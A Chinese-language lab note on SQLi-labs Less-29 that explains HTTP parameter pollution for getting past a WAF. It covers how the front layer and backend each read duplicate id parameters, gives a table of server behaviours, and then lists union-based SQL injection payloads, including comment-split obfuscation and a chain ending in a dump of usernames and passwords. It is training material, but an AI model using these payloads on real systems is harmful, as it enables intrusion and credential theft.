# Less-29 HTTP 参数污染 (HPP) 绕过 WAF

## 核心原理

模拟 WAF + 后端两层架构：
- **WAF**（Tomcat/前端防火墙）只检查第一个 `id` 参数
- **后端**（Apache/PHP）取**最后一个** `id` 参数

两层的参数处理方式不同 → 绕过检查。

## 不同服务器行为速查

| 服务器 | 重复参数处理 | 备注 |
|--------|-------------|------|
| Apache/PHP | 取最后一个 | 常用 HPP 场景 |
| Tomcat/JSP | 取第一个 | 注意方向相反 |
| IIS/ASP | 拼接（逗号分隔） | payload 可能变形 |
| Python/Flask | 取列表 | 需处理数组 |

## 绕过 Payload

```sql
-- WAF 看第一个 id=1（安全），后端用第二个（payload）
?id=1&id=-1' union select 1,database(),3--+

-- 如果 union/select 也被过滤，叠加之前的绕过技巧
?id=1&id=-1' un/**/ion sel/**/ect 1,database(),3--+
```

## 完整链

```sql
?id=1&id=-1' union select 1,2,3--+
?id=1&id=-1' union select 1,database(),3--+
?id=1&id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=1&id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
?id=1&id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```
